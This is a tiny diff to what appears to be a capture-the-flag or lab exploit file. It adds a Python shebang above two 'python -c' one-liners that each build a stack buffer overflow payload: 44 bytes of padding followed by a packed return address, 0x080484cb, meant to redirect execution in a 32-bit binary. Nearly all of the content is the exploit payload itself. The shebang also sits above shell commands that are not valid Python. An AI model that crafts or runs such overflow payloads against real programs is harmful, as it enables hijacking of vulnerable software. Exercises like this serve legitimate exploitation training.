@@ -1,3 +1,5 @@
+#!/usr/bin/env python
+
 python -c 'print "A"*44 + "\xcb\x84\x04\x08"'
 python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'
 
